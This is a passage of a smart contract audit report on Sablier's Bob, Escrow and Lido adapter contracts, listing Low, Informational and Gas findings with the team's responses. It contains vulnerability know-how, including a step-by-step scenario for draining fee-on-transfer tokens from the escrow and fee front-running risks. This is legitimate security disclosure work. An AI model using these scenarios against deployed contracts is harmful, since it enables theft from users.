However `SablierBob::redeem` utilizes `SablierComptroller::calculateMinFeeWei` which only considers the `minFeeUSD` member and ignores any custom fees configured, leading to lower or higher fees being collected from users than intended. This especially becomes problematic if certain users are expected to receive discounted or no fees due to other external factors/criteria:
```solidity
uint256 minFeeWei = comptroller.calculateMinFeeWei({ protocol: ISablierComptroller.Protocol.Bob });
```

**Recommended Mitigation:** Use `SablierComptroller::calculateMinFeeWeiFor` instead of `calculateMinFeeWei`.

**Sablier:** Acknowledged. This is an intentional design choice. We prefer to apply a global fee rather than adjusting fees on a per-user basis.

\clearpage
## Low Risk


### `SablierEscrow` buyers and sellers can't set max fee slippage

**Description:** The comptroller can change trade fees via `SablierEscrow::setTradeFee` however buyers and sellers can't set their preferred max fee slippage.

Hence the comptroller could front-run a call to `SablierEscrow::fillOrder` by increasing the fee such that the buyer and seller receive less tokens than expected, or the fee could be changed organically after the order was created but before it was filled.

That said there is a hardcoded `MAX_TRADE_FEE` which does offer some protection.

**Recommended Mitigation:** Consider allowing the buyers and sellers to set a `maxTradeFee` parameter which prevents the order from being filled if the current trade fee is greater. Alternatively consider snapshotting the current fee at creation time similar to `SablierLidoAdapter::registerVault`.

**Sablier:** Acknowledged; not allowing traders to set max trade slippage is a business decision. Since the fee cannot exceed `MAX_TRADE_FEE`, if we set it to 2% (thats what we will do it in practice), it should mitigate the issue of charging high fees.


### `feeAmount` never set when no vault adapter used in `SablierBob::redeem`

**Description:** When no vault adapter is used in `SablierBob::redeem`, the output `feeAmount` is never set even though:
* the user does pay a fee as `msg.value`
* `feeAmount` is returned as an output variable and also emitted in the `Redeem` event

**Sablier:** Fixed in commit [75448ba](https://github.com/sablier-labs/lockup/commit/75448ba4e6f5f22207cc5b03096206a7708e5a54) by renaming `feeAmount` to `feeAmountDeductedFromYield` to make it explicit that this applies only when vault adapters are used.

**Cyfrin:** Verified.


### `SablierEscrow::fillOrder` lacks deadline parameter for buyer protection, same with swaps in `SablierLidoAdapter::_wstETHToWeth`

**Description:** `SablierEscrow::fillOrder` (`SablierEscrow.sol:167-243`) has no deadline/expiry parameter for the buyer's transaction. A buyer's fill transaction can sit in the mempool indefinitely and execute at a later time when market conditions have changed unfavorably.

**Impact:** A buyer submits a fill transaction at a favorable price. The transaction gets stuck in the mempool (low gas, network congestion). By the time it executes, the market price has moved significantly such that the buyer would have never filled in the current conditions. The buyer has no protection against stale execution; this is analogous to the well-known missing deadline parameter in AMM swaps.

**Recommended Mitigation:** Add an optional `deadline` parameter to `fillOrder`:
```solidity
function fillOrder(uint256 orderId, uint128 buyAmount, uint40 deadline) external {
    if (deadline > 0 && block.timestamp > deadline) {
        revert Errors.SablierEscrow_Expired(deadline);
    }
    // ... rest of function
}
```

Similarly swaps occur inside `SablierLidoAdapter::_wstETHToWeth` but these transactions also don't have a deadline input.

**Sablier:** Acknowledged; we believe that, unlike AMMs, the setup here is different because:
(i) in case the order has a specific buyer set, they know preemptively what the minimum price they will pay for is - and we expect it to be used as `buyAmount == minBuyAmount` - and there is no change to `minBuyAmount` during the time the tx is signed and actually included in the block (i.e. the time in the mempool)
(ii) the order doesn’t have a buyer set: here we expect to have a “race” condition for who gets the tx first - whether it’s a human or an MEV bot.


### `ExitWithinGracePeriod` event emits inaccurate `amountReceived` for adapter vaults

**Description:** In `SablierBob::exitWithinGracePeriod` (`SablierBob.sol:237-287`), the event always emits the share balance as `amountReceived`:

```solidity
emit ExitWithinGracePeriod(vaultId, msg.sender, amount, amount);
```

For non-adapter vaults this is correct — tokens transfer 1:1 with shares. But for adapter vaults (line 278-280), the actual WETH received depends on the Curve stETH→ETH swap which is subject to slippage:

```solidity
if (address(vault.adapter) != address(0)) {
    vault.adapter.unstakeForUserWithinGracePeriod(vaultId, msg.sender);
} else {
    vault.token.safeTransfer(msg.sender, amount);
}
```

`SablierLidoAdapter::unstakeForUserWithinGracePeriod` does not return the WETH received to the caller, so `SablierBob` has no way to emit the correct value. The adapter emits its own `UnstakeForUserWithinGracePeriod` event with the accurate amount in the same transaction, but the parent `ExitWithinGracePeriod` event's `amountReceived` is misleading.

**Recommended Mitigation:** Have `unstakeForUserWithinGracePeriod` return the WETH received, then use that value in the event:
```solidity
if (address(vault.adapter) != address(0)) {
    uint128 received = vault.adapter.unstakeForUserWithinGracePeriod(vaultId, msg.sender);
    emit ExitWithinGracePeriod(vaultId, msg.sender, received, amount);
} else {
    vault.token.safeTransfer(msg.sender, amount);
    emit ExitWithinGracePeriod(vaultId, msg.sender, amount, amount);
}
```

**Sablier:** Fixed in commit [74fa619](https://github.com/sablier-labs/lockup/commit/74fa619471e00958b6b922f8b6c4d9bb95ccc37a) by removing the early exit grace period functionality.

**Cyfrin:** Verified.


### Excess ETH not refunded in non-adapter vault redemption

**Description:** In `SablierBob::redeem` (`SablierBob.sol:346-366`), for non-adapter vaults, the entire `msg.value` is forwarded to the comptroller without refunding any excess:

```solidity
uint256 minFeeWei = comptroller.calculateMinFeeWei({ protocol: ISablierComptroller.Protocol.Bob });

if (msg.value < minFeeWei) {
    revert Errors.SablierBob_InsufficientFeePayment(msg.value, minFeeWei);
}

if (msg.value > 0) {
    (bool success,) = address(comptroller).call{ value: msg.value }("");
    if (!success) {
        revert Errors.SablierBob_NativeFeeTransferFailed();
    }
}
```

There is no refund of `msg.value - minFeeWei` to the caller.

**Impact:** If a user sends more ETH than the minimum fee (e.g., sends 1 ETH when `minFeeWei` is 0.001 ETH), the entire 1 ETH goes to the comptroller and the excess 0.999 ETH is permanently lost to the user. This is especially likely if:
- Users overestimate the required fee to avoid reverts
- `minFeeWei` changes between transaction submission and mining (user sends extra as buffer)
- Frontend miscalculates the fee amount

**Proof of Concept:** Add the following test to `tests/bob/integration/concrete/redeem/redeemPoC.t.sol`:

```solidity
/// The ENTIRE msg.value is forwarded to the comptroller, even if it far exceeds
/// the minimum required fee. Users who overpay lose the excess permanently
function test_ExcessETHNotRefunded() external {
    // Set a non-zero minimum fee
    setMsgSender(admin);
    comptroller.setMinFeeUSD(ISablierComptroller.Protocol.Bob, 1e8); // $1

    // Create vault, deposit, expire
    setMsgSender(users.depositor);
    uint256 vaultId = createDefaultVault();
    bob.enter(vaultId, DEPOSIT_AMOUNT);
    vm.warp(EXPIRY + 1);

    // Get minFee and send 10x that amount
    uint256 minFee =
        comptroller.calculateMinFeeWeiFor({ protocol: ISablierComptroller.Protocol.Bob, user: users.depositor });
    assertGt(minFee, 0, "minFee should be > 0");
    uint256 overpayment = minFee * 10;

    uint256 comptrollerBefore = address(comptroller).balance;

    bob.redeem{ value: overpayment }(vaultId);

    // Entire overpayment went to comptroller - no refund to user
    assertEq(
        address(comptroller).balance - comptrollerBefore,
        overpayment,
        "CONFIRMED: full overpayment sent, no refund"
    );
}
```

Run with: `forge test --match-test test_ExcessETHNotRefunded -vvv`

**Recommended Mitigation:** Only forward the required fee and refund the excess (or alternatively, use `require(msg.value == minFeeWei)` to enforce exact payment):
```solidity
if (msg.value > 0) {
    uint256 feeToSend = minFeeWei;
    (bool success,) = address(comptroller).call{ value: feeToSend }("");
    if (!success) {
        revert Errors.SablierBob_NativeFeeTransferFailed();
    }
    // Refund excess
    uint256 excess = msg.value - feeToSend;
    if (excess > 0) {
        (bool refundSuccess,) = msg.sender.call{ value: excess }("");
        if (!refundSuccess) {
            revert Errors.SablierBob_NativeRefundFailed();
        }
    }
}
```

**Sablier:** Acknowledged; this is by design and a business decision.


### Fee calculations round in favor of the user instead of the protocol

**Description:** Fee calculations in both `SablierLidoAdapter` and `SablierEscrow` use `UD60x18::mul` which internally computes `(a * b) / 1e18` — this division truncates (rounds down). Since fees are amounts the protocol collects, rounding down means the protocol receives less than the exact amount and the user retains more. The standard practice is to round fees up (in favor of the protocol).

In `SablierLidoAdapter::calculateAmountToTransferWithYield` (`SablierLidoAdapter.sol:186-187`):
```solidity
feeAmount = ud(yieldAmount).mul(_vaultYieldFee[vaultId]).intoUint128();
amountToTransfer = userWethShare - feeAmount;
```

In `SablierEscrow::fillOrder` (`SablierEscrow.sol:212-217`):
```solidity
feeDeductedFromBuyerAmount = ud(order.sellAmount).mul(currentTradeFee).intoUint128();
amountToTransferToBuyer -= feeDeductedFromBuyerAmount;

feeDeductedFromSellerAmount = ud(buyAmount).mul(currentTradeFee).intoUint128();
amountToTransferToSeller -= feeDeductedFromSellerAmount;
```

In all three cases, `mul` truncates, so the fee rounds down — against the protocol.

For comparison, the non-fee calculation `userWstETH * totalWeth / totalWstETH` correctly rounds down (user receives less, protocol retains dust).

**Impact:** The protocol collects slightly less fees than the exact amount on every redemption and trade. The per-transaction loss is at most 1 wei due to UD60x18's 18-decimal precision, but it accumulates over time and violates the principle that rounding should always favor the protocol.

Incorrect rounding directions have historically been used as part of blackhat exploit chains so using correct rounding directions is a good defensive practice.

**Recommended Mitigation:** Use ceiling division for fee calculations. PRBMath does not provide a `mulDiv18Up`, so add 1 wei when there is a remainder:
```solidity
uint256 raw = ud(yieldAmount).mul(_vaultYieldFee[vaultId]).unwrap();
feeAmount = raw + 1; // round up by 1 wei to favor the protocol
```

Or implement a `mulDivUp` helper: `(a * b + denominator - 1) / denominator`.

**Sablier:** Acknowledged; we decided not to implement the change, we are ok with the dust.


### Dust WETH permanently stuck in `SablierBob` after adapter vault redemptions

**Description:** In `SablierLidoAdapter::calculateAmountToTransferWithYield` (`SablierLidoAdapter.sol:178`), each user's WETH share is computed with truncating division:

```solidity
uint128 userWethShare = (userWstETH * totalWeth / totalWstETH).toUint128();
```

Each truncation loses up to 1 wei. After all users of an adapter vault redeem, the sum of all individual `userWethShare` values is slightly less than `totalWeth`. The remainder stays in `SablierBob` as WETH with no sweep or recovery function.

For example, with 100 users in a vault, up to 99 wei of WETH could be permanently stuck after all redemptions complete.

**Impact:** The per-vault dust amount is negligible (at most `numUsers - 1` wei of WETH per vault). However, it accumulates across all adapter vaults over the protocol's lifetime and there is no mechanism to recover these funds. The impact is economic dust, not a security risk.

**Recommended Mitigation:** Add an admin-callable sweep function to recover residual WETH from fully-redeemed adapter vaults, or allow the last redeemer to receive the remaining balance instead of their truncated share.

**Sablier:** Acknowledged.



### Seller `minBuyAmount` order parameter is not respected due to post application of trade fees

**Description:** The `SablierEscrow::fillOrder` function ensures that the `buyAmount` provided by the buyer is not lower than the `minBuyAmount` asked by the seller. However, the seller can receive an amount lower than `minBuyAmount` as trading fees are applied after the check.

```solidity
// Check: the buy amount meets the minimum asked.
if (buyAmount < order.minBuyAmount) {
            revert Errors.SablierEscrow_InsufficientBuyAmount(buyAmount, order.minBuyAmount);
}

... ...

// Calculate the fee on the buy amount.
feeDeductedFromSellerAmount = ud(buyAmount).mul(currentTradeFee).intoUint128();
amountToTransferToSeller -= feeDeductedFromSellerAmount;
```

**Impact:** User receives amount lower than the `minBuyAmount` asked.

**Proof of Concept:** Let's assume the following scenario:
 - Alice requested 10 WETH from buyer as `minBuyAmount`.
 - Bob fills the order by providing the 10 WETH exactly.
 - Assuming a trading fee of 1%, Alice will receive 9 WETH in total as a result instead of the 10 WETH asked.

**Recommended Mitigation:** Consider modifying and moving the if condition check after application of trade fees as shown below:

```solidity
// If the fee is non-zero, deduct the fee from both sides.
        if (currentTradeFee.unwrap() > 0) {
            ... ... ...
        }

if (amountToTransferToSeller < order.minBuyAmount) {
            revert Errors.SablierEscrow_InsufficientBuyAmount(amountToTransferToSeller, order.minBuyAmount);
        }
```

**Sablier:** In commit [edc617b](https://github.com/sablier-labs/lockup/commit/edc617bc708cd23ceac7fb65bf51076d5ae85c5d) we updated the natspec to make more explicit the purpose of this variable as being the _"minimum amount of buy token required to fill the order"_.

**Cyfrin:** Verified.


### ETH sent with adapter vault redemption is trapped in `SablierBob`

**Description:** `SablierBob::redeem` is declared `payable` unconditionally, but only the non-adapter path handles `msg.value`. When a user calls `redeem` on an adapter vault with `msg.value > 0` (`SablierBob.sol:290-373`), the adapter path (`SablierBob.sol:326-345`) never checks, forwards, or refunds the ETH:

```solidity
if (address(vault.adapter) != address(0)) {
    // Adapter path: handles ERC-20 yield fee
    // msg.value is NEVER checked, forwarded, or refunded
}
else {
    // Non-adapter path: checks msg.value >= minFeeWei, forwards to comptroller
}
```

The ETH enters `SablierBob` via the `payable` function but has no code path to return to the user. It remains in the contract until someone calls `transferFeesToComptroller` (inherited from `Comptrollerable`), which sweeps the contract's entire ETH balance to the comptroller — not back to the user who sent it.

**Impact:** Users who mistakenly send ETH when redeeming from adapter vaults permanently lose that ETH. While `transferFeesToComptroller` can recover the ETH to the comptroller, the user who sent it has no claim to it. The likelihood is low since adapter vaults don't require ETH fees, but the `payable` modifier provides no indication that ETH is unnecessary and will be lost.

**Recommended Mitigation:** Revert early in the adapter path if `msg.value > 0`:

```solidity
if (address(vault.adapter) != address(0)) {
    if (msg.value > 0) {
        revert Errors.SablierBob_UnexpectedNativeToken(vaultId);
    }
    // ... rest of adapter logic
}
```

**Sablier:** Fixed in commit [44b6bf1](https://github.com/sablier-labs/lockup/commit/44b6bf10f5e9e126b808f8bfd20a098d1275063f).

**Cyfrin:** Verified.


### `SablierBob::enter` can be temporarily bricked for adapter vaults when STETH is paused

**Description:** The `SablierBob::enter` function calls the `SablierLidoAdapter::stake` function.

```solidity
if (address(vault.adapter) != address(0)) {
            // Interaction: Transfer token from caller to the adapter.
            vault.token.safeTransferFrom(msg.sender, address(vault.adapter), amount);

            // Interaction: stake the tokens via the adapter.
            vault.adapter.stake(vaultId, msg.sender, amount);
```

In case of the `SablierLidoAdapter`, the function calls `STETH::submit` that reverts when either staking is paused or the staking limit is exceeded. In such a case, users cannot enter vaults utilizing this adapter.

```solidity
        require(!stakeLimitData.isStakingPaused(), "STAKING_PAUSED");

        if (stakeLimitData.isStakingLimitSet()) {
            uint256 currentStakeLimit = stakeLimitData.calculateCurrentStakeLimit();
            require(_amount <= currentStakeLimit, "STAKE_LIMIT");
```

A similar instance exists for the withdrawal flow. The `SablierLidoAdapter::_wstETHToWeth` function performs an unwrap on the `wstETH` contract, which transfers `stETH` to the adapter. Since `stETH` transfers can be paused, this would prevent users from exiting within the grace period or redeeming when the vault has settled or expired.

```solidity
function _transferShares(address _sender, address _recipient, uint256 _sharesAmount) internal {
        require(_sender != address(0), "TRANSFER_FROM_ZERO_ADDR");
        require(_recipient != address(0), "TRANSFER_TO_ZERO_ADDR");
        require(_recipient != address(this), "TRANSFER_TO_STETH_CONTRACT");
        _whenNotStopped();
```

**Recommended Mitigation:** Consider notifying users on the user interface about such temporary vault entry restrictions. In case of a prolonged restriction, it is recommended to update the default adapter for the token to `address(0)`. This would allow users to utilize the Bob protocol without involving adapters for yield generation.

**Sablier:** Acknowledged; we will notify users in the UI.

\clearpage
## Informational


### Use read-then-increment in one line

**Description:** Use read-then-increment in one line:

* `SablierEscrow::createOrder`
```diff
-       orderId = nextOrderId;
-       unchecked {
-           nextOrderId = orderId + 1;
-       }
+       unchecked { orderId = nextOrderId++; }
```

* `SablierBob::createVault`
```diff
-       vaultId = nextVaultId;
-       unchecked {
-           nextVaultId = vaultId + 1;
-       }
+       unchecked { vaultId = nextVaultId++; }
```

**Sablier:** Acknowledged.


### Missing or inadequate Chainlink Oracle checks in `SablierBob.sol`

**Description:** The client's audit onboarding docs indicate that the protocol is intended to be deployed onto L2s and to work with Chainlink Oracles and also non-Chainlink Oracles with a Chainlink-compatible interace.

`SablierBob.sol` uses the `SafeOracle` library however this library omits certain checks as it is designed to not be exclusive to Chainlink Oracles. `SablierBob.sol` does not implement these additional checks, hence it is missing or has inadequate [chainlink oracle checks](https://medium.com/sablier-labs/chainlink-oracle-defi-attacks-93b6cb6541bf):
* no checks for [stale prices](https://medium.com/sablier-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#99af)
* protocol intends to deploy on L2s explicitly Arbitrum & Base but has no checks for [L2 sequencer downtime](https://medium.com/sablier-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#0faf) - when implementing this also [revert](https://solodit.sablier-labs.io/issues/insufficient-checks-to-confirm-the-correct-status-of-the-sequenceruptimefeed-codehawks-zaros-git) if `startedAt == 0`
* no enforcement that returned chainlink price is inside the [aggregator's min/max price](https://medium.com/sablier-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac) - though according to the latest [Chainlink docs](https://docs.chain.link/data-feeds/api-reference#variables-and-functions-in-accesscontrolledoffchainaggregator) the on-chain functions for fetching these are deprecated so consider being able to set them manually

**Sablier:** Acknowledged; while we agree it’s a best practice (and we do have these checks in the Comptroller where no fee is charged if price isn’t updated in 24 hours), adding a staleness check to Bob vaults doesn’t benefit users. Consider:

Case 1: Revet if stale - If the oracle becomes stale and never recovers, users can’t withdraw funds until the end time, even if the target price is reached.

Case 2: Return 0 if stale - same issue as above.

These checks could trap user funds, frustrating those who trust the vault to respect the target price. The only scenario impacted is if the oracle goes stale after hitting the target price → allowing withdrawals even though market price has gone below the target price, but this we believe is acceptable. This benefits users rather than restricting them.


### In Solidity don't initialize to default values

**Description:** In Solidity don't initialize to default values:
```solidity
SablierBob.sol
463:        for (uint256 i = 0; i < length; ++i) {
```

**Sablier:** Acknowledged; we prefer initializing to default values in for loop.


### Remove or resolve TODO

**Description:** Remove or resolve TODO:
```solidity
SablierBob.sol
330:                // TODO: transfer entire fee to comptroller admin instead of transferring when user redeems.
```

**Sablier:** Fixed in commit [7928553](https://github.com/sablier-labs/lockup/commit/79285536d2dde653c0a7629785787ffb79f548f6#diff-f327a4238131660e66994c40e1d9f1ddd672c4403ed6f4ca2f1e04f7c82a86c3L330).

**Cyfrin:** Verified.


### Attacker can permanently lock or drain fee-on-transfer tokens from `SablierEscrow`

**Description:** The `SablierEscrow` is a contract that enables peer-to-peer trading between users to swap ERC-20 tokens with each other. The contract allows users to create, cancel and fill orders anytime. When creating orders, the contract does not handle the case where the `sellToken` is a fee-on-transfer token.

This leads to a case where the `_orders` mapping stores an inflated `sellAmount` than the actual `sellToken` amount received by the contract in the subsequent transfer.
```solidity
        // Effect: create the order.
        _orders[orderId] = Escrow.Order({
            seller: msg.sender,
            buyer: buyer,
            sellToken: sellToken,
            buyToken: buyToken,
            sellAmount: sellAmount,
            minBuyAmount: minBuyAmount,
            expiryTime: expiryTime,
            wasCanceled: false,
            wasFilled: false
        });

        // Interaction: transfer sell tokens from caller to this contract.
        sellToken.safeTransferFrom(msg.sender, address(this), sellAmount);
```

When cancelling or filling the order using functions `SablierEscrow::cancelOrder` and `SablierEscrow::fillOrder`, it would transfer out the stored inflated `sellAmount` from the `_orders` mapping. If existing orders for the same token exist, the inflated amount will tap into the balance of these other orders. If no other order exists, the tokens remain permanently locked in the contract.

**Impact:** All fee-on-transfer tokens can be drained or remain permanently locked in the contract.

The issue is rated as Informational-severity since fee on transfer tokens are explicitly not supported per the "Protocol Risks" section of the [documentation](https://www.notion.so/sablier-labs/2026-19-02-Sablier-Bob-301f46a1865c804c8806e4c961d190f2?source=copy_link#301f46a1865c80babbadde77b96a3fad) which states:

`Should we evaluate risks due to fee-on-transfer tokens? | No`

However since tokens such as USDT (which includes a fee-activation switch) and stETH (which has the 1-2 wei corner case on transfers as per the [Lido documentation](https://docs.lido.fi/guides/lido-tokens-integration-guide/#1-2-wei-corner-case)) are in-scope, we considered to report this finding.

**Proof of Concept:** Let's take a simple scenario to understand the issue:
 - Assume token A is a fee-on-transfer token with 2% fee.
 - Alice places an order to sell token A with `sellAmount` passed as 10e18. The contract stores `sellAmount` as 10e18 however the escrow only holds 8e18 tokens.
 - Malicious Bob creates an order to sell token A with similar parameters. The contract now holds a balance of 8e18 + 8e18 = 16e18 tokens.
 - Bob cancels his order and receives 10e18 from the contract, leaving 6e18 tokens in the escrow.
 - Bob continues this process until all tokens have been drained from the contract.
 - Alice still has an open order but the order can neither be filled nor cancelled at this point.

**Recommended Mitigation:** Consider checking the balance of the `sellToken` before and after the transfer. Use the difference the store the final `sellAmount` received in the `_orders` mapping. Alternatively, if such tokens are not intended to be supported in the SablierEscrow, consider acknowledging this finding.

**Sablier:** Fee on transfer tokens are explicitly not supported; if users deposit tokens which may have fee-on-transfer enabled in the future, they do this at their own risk.


### Add validation in `SablierBob::createOrder` to disallow same address as `buyer` and `seller`

**Description:** Function `SablierBob::createOrder` does not check and disallow the `buyer` from being `msg.sender` (the seller) itself.

```solidity
function createOrder(
        IERC20 sellToken,
        uint128 sellAmount,
        IERC20 buyToken,
        uint128 minBuyAmount,
        address buyer,
        uint40 expiryTime
    )
```

**Recommended Mitigation:** Add validation to disallow the buyer and seller to be the same. Also consider preventing `sellToken == buyToken`.

**Sablier:** Acknowledged; adding the check would increase gas a bit for a typical use case. Even if buyer and seller are same, or buy and sell token are same, it does not introduce any risk or a concern. That’s why we decided to not take any action.


### Emit event `SyncPriceFromOracle` when price is synced

**Description:** Event `SyncPriceFromOracle` is emitted with `latestPrice` as 0 even when the price has not been synced, which can lead to inaccurate offchain event tracking.

```solidity
// Get the latest price from the oracle with safety checks.
        (latestPrice,) = SafeOracle.safeOraclePrice(oracleAddress);

        // Effect: update the last synced price and timestamp if the latest price is greater than zero.
        if (latestPrice > 0) {
            _vaults[vaultId].lastSyncedPrice = latestPrice;
            _vaults[vaultId].lastSyncedAt = uint40(block.timestamp);
        }

        // Log the event.
        emit SyncPriceFromOracle(vaultId, oracleAddress, latestPrice, uint40(block.timestamp));
```

**Recommended Mitigation:** Consider emitting the event `SyncPriceFromOracle` inside the if block as follows:

```solidity
// Get the latest price from the oracle with safety checks.
        (latestPrice,) = SafeOracle.safeOraclePrice(oracleAddress);

        // Effect: update the last synced price and timestamp if the latest price is greater than zero.
        if (latestPrice > 0) {
            _vaults[vaultId].lastSyncedPrice = latestPrice;
            _vaults[vaultId].lastSyncedAt = uint40(block.timestamp);

            // Log the event.
            emit SyncPriceFromOracle(vaultId, oracleAddress, latestPrice, uint40(block.timestamp));
        }
```


**Sablier:** Fixed in [https://github.com/sablier-labs/lockup/pull/1420](https://github.com/sablier-labs/lockup/pull/1420).

**Cyfrin:** Verified.


### Missing getter function for `SablierBobState::isStakedInAdapter`

**Description:** The `SablierBobState` contract implements getter functionality for all members of the `Vault` struct for a particular `vaultId`. However it does not implement one for the `isStakedInAdapter` member.
```solidity
struct Vault {
        // slot 0
        IERC20 token;
        uint40 expiry;
        uint40 lastSyncedAt;
        // slot 1
        IBobVaultShare shareToken;
        // slot 2
        AggregatorV3Interface oracle;
        // slot 3
        ISablierBobAdapter adapter;
        bool isStakedInAdapter;
        // slot 4
        uint128 targetPrice;
        uint128 lastSyncedPrice;
    }
```

**Recommended Mitigation:** Consider implementing a getter function for the `isStakedInAdapter` member.

**Sablier:** Fixed in commit [c616091](https://github.com/sablier-labs/lockup/pull/1420/changes/c6160910fc7fb6669b11c6338336eab12400dd6d).

**Cyfrin:** Verified.


### Consider adding a vault migration feature so non-adapter vault users can migrate to a vault with an adapter

**Description:** When a vault is created using `SablierBob::createVault`, the adapter for the `vaultId` is retrieved from the `_defaultAdapters` mapping, which can store both a zero or non-zero value. The issue is that if an adapter is added after a user has created and deposited into a vault, the user loses out on potential yield from that adapter.

For example:
 - Alice creates a vault for WBTC token with an expiry 3 years from the current timestamp.
 - After 1 month, the team decides to add an adapter for the WBTC token.
 - Bob, Charlie and other users create another vault for the WBTC token and deposit in it to earn yield from the adapter that provides 6% returns annually.
 - Alice is locked for 3 years with no interest.

This can create user dissatisfaction since multiple users could be locked for years or decades in vaults that do not generate yield currently but may in the future with adapter integrations.

**Recommended Mitigation:** Consider implementing functionality that allows existing non-adapter vaults to migrate and earn yield.

**Sablier:** Acknowledged; may be added in a future version.

\clearpage
## Gas Optimization


### Don't copy entire struct from `storage` to `memory` when only few fields required

**Description:** Don't copy entire struct from `storage` to `memory` when only few fields required:

* `SablierBobState::_statusOf`
```diff
-        Bob.Vault memory vault = _vaults[vaultId];
+        Bob.Vault storage vault = _vaults[vaultId];
```

* `SablierEscrowState::_statusOf`
```solidity
    function _statusOf(uint256 orderId) internal view returns (Escrow.Status) {
        // @audit more efficient implementation
        // get storage reference
        Escrow.Order storage order = _orders[orderId];

        // 1 SLOAD
        (bool wasFilled, bool wasCanceled, uint40 expiryTime)
            = (order.wasFilled, order.wasCanceled, order.expiryTime);

        if (wasFilled) {
            return Escrow.Status.FILLED;
        }
        if (wasCanceled) {
            return Escrow.Status.CANCELLED;
        }

        // Return EXPIRED if the order has an expiry timestamp and it has expired.
        if (expiryTime != 0 && block.timestamp >= expiryTime) {
            return Escrow.Status.EXPIRED;
        }

        return Escrow.Status.OPEN;
    }
```

* `SablierEscrow::cancelOrder` - similar improvements to the previous by getting a `storage` reference then loading the first slot in 1 SLOAD

* `SablierEscrow::fillOrder` - potentially also better to use a `storage` reference then only read from storage required slots, to prevent duplicating storage reads already done inside the call to `_statusOf`

* `SablierBob::enter` - only needs `vault.adapter, vault.token, vault.shareToken`

**Sablier:** Fixed in commits [bc5d883](https://github.com/sablier-labs/lockup/commit/bc5d8839130b07cecaff64df591bc27fdbd8f374), [48f25c4](https://github.com/sablier-labs/lockup/commit/48f25c4c99a304b016650c5e2cdeda3bd96647bd), [PR1444](https://github.com/sablier-labs/lockup/pull/1444/changes).

**Cyfrin:** Verified; the fixes aren't exactly as recommended but still more efficient than the original implementations.


### Emit event first to optimize away previous value variables

**Description:** Emit event first to optimize away previous value variables, eg in `SablierEscrow::setTradeFee`:
```diff
-       UD60x18 previousTradeFee = tradeFee;
+       emit SetTradeFee(address(comptroller), tradeFee, newTradeFee);
        tradeFee = newTradeFee;
-       emit SetTradeFee(address(comptroller), previousTradeFee, newTradeFee);
```

Similar optimizations can be made in:
* `SablierLidoAdapter::setYieldFee`
* `SablierLidoAdapter::setSlippageTolerance`

**Sablier:** Acknowledged; we have the practice of emitting the events on the last line in the function.


### Use `ReentrancyGuardTransient` for faster `nonReentrant` modifiers

**Description:** Use [ReentrancyGuardTransient](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol) for faster `nonReentrant` modifiers:
```solidity
SablierBob.sol
10:import { ReentrancyGuard } from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
42:    ReentrancyGuard, // 1 inherited component
```

**Sablier:** Acknowledged.


### QA/Gas improvements in related Sablier contracts

**Description:** While technically outside the scope of this audit, we also had to read and understand other related Sablier contracts as the in-scope contracts inherit from them. Here is a collection of QA/gas findings from these contracts.

* use [SafeTransferLib::safeTransferETH](https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L95-L103) instead of Solidity `call` to send ETH - `Comptrollerable::transferFeesToComptroller`. Alternatively use a low-level call patterns such as:
```solidity

```diff
-        (bool success,) = address(comptroller).call{ value: feeAmount }("");
+        bool success;
+        address feeReceiver = comptroller;
+        assembly { success := call(gas(), feeReceiver, feeAmount, 0, 0, 0, 0) }
```

* cache storage to prevent identical storage reads - `Comptrollerable::transferFeesToComptroller`

* [cheaper](https://github.com/devdacian/solidity-gas-optimization?tab=readme-ov-file#6-dont-cache-calldata-length-effective-009-cheaper) not to cache `calldata` length - `Batch::batch`

* in Solidity don't initialize to default values - `Batch::batch`

**Sablier:** Fixed the second point in commit [0a5ed9d](https://github.com/sablier-labs/lockup/commit/0a5ed9d1f6b3fa258be9de1129fa533ba2620725), acknowledging the rest.

**Cyfrin:** Verified.


### Use named return variables where this can optimize away local variables

**Description:** Use named return variables where this can optimize away local variables:
* `SablierBob::_safeTokenSymbol`

**Sablier:** Fixed in commit [0c05295](https://github.com/sablier-labs/lockup/commit/0c05295253e369d1d0549ebd7256b3807313cd3a).

**Cyfrin:** Verified.


### Revert fast by performing input related checks prior to storage reads and external calls

**Description:** Revert fast by performing input related checks prior to storage reads and external calls:
* `SablierBob::enter` - perform `amount` check first
* `SablierLidoAdapter::updateStakedTokenBalance` - perform `userShareBalanceBeforeTransfer` check first

**Sablier:** Fixed in commit [0b2ea33](https://github.com/sablier-labs/lockup/commit/0b2ea3320e6ced340588c916d53713e0ce98136e).

**Cyfrin:** Verified.


### Cache storage to prevent identical storage reads

**Description:** Reading from storage is expensive; cache storage to prevent identical storage reads:
* `SablierBob::exitWithinGracePeriod, redeem` - `vault.shareToken`, potentially also `vault.adapter` if the most likely case is non-zero
* `SablierBob::redeem` - `comptroller` in the branch where no vault adapter exists if `minFeeWei` is likely to be > 0
* `SablierBob::unstakeTokensViaAdapter` - `vault.adapter`
* `SablierBob::onShareTransfer` - `_vaults[vaultId].adapter` if the most likely case is non-zero

**Sablier:** Fixed in commit [7d9ac86](https://github.com/sablier-labs/lockup/commit/7d9ac86a6edc85383b1fc9b58fdfbaf78a8f1cb1).

**Cyfrin:** Verified.


### `SablierBob::_unstakeFullAmountViaAdapter` should take `vault.adapter` as input parameter

**Description:** `SablierBob::_unstakeFullAmountViaAdapter` should take `vault.adapter` as an input parameter since both callers already read it, so there is no point in re-reading it again from storage when the value is already known.

**Sablier:** Fixed in commit [7d9ac86](https://github.com/sablier-labs/lockup/commit/7d9ac86a6edc85383b1fc9b58fdfbaf78a8f1cb1).

**Cyfrin:** Verified.


### Use `SafeTransferLib::safeTransferETH` instead of Solidity `call` to send ETH in `SablierBob::redeem`

**Description:** Using [SafeTransferLib::safeTransferETH](https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L95-L103) instead of Solidity `call` to send ETH in `SablierBob::redeem` is more [gas efficient](https://github.com/devdacian/solidity-gas-optimization?tab=readme-ov-file#10-use-safetransferlibsafetransfereth-instead-of-solidity-call-effective-035-cheaper).

Alternatively use a low-level pattern without introducing any new dependencies such as:
```diff
-        (bool success,) = address(_comptroller).call{ value: msg.value }("");
+        bool success;
+        assembly { success := call(gas(), _comptroller, msg.value, 0, 0, 0, 0) }
```

